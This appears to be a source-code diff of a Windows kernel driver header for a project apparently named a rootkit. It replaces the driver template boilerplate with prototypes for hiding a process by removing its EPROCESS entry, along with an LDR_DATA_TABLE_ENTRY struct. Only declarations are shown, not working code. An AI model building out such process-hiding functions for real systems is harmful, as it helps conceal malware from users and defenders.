@@ -1,35 +1,51 @@
-/*++
 
-Module Name:
-
-    driver.h
-
-Abstract:
-
-    This file contains the driver definitions.
-
-Environment:
-
-    Kernel-mode Driver Framework
-
---*/
+#include <ntifs.h>
 
 #include <ntddk.h>
 #include <wdf.h>
-#include <initguid.h>
+#include <stdlib.h>
 
-#include "device.h"
-#include "queue.h"
-#include "trace.h"
-
-EXTERN_C_START
-
-//
-// WDFDRIVER Events
-//
-
+int HideProcess(int targetPID);
+int GetImageFileNameOffset(char* name);
+int SearchAndRemoveEPROCESSbyOffset(int offset, char* target);
 DRIVER_INITIALIZE DriverEntry;
-EVT_WDF_DRIVER_DEVICE_ADD RootKitDriverEvtDeviceAdd;
-EVT_WDF_OBJECT_CONTEXT_CLEANUP RootKitDriverEvtDriverContextCleanup;
 
-EXTERN_C_END
+
+
+
+//https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html
+typedef unsigned short WORD, * PWORD, * LPWORD;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    WORD LoadCount;
+    WORD TlsIndex;
+    union
+    {
+        LIST_ENTRY HashLinks;
+        struct
+        {
+            PVOID SectionPointer;
+            ULONG CheckSum;
+        };
+    };
+    union
+    {
+        ULONG TimeDateStamp;
+        PVOID LoadedImports;
+    };
+    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
+    PVOID PatchInformation;
+    LIST_ENTRY ForwarderLinks;
+    LIST_ENTRY ServiceTagLinks;
+    LIST_ENTRY StaticLinks;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
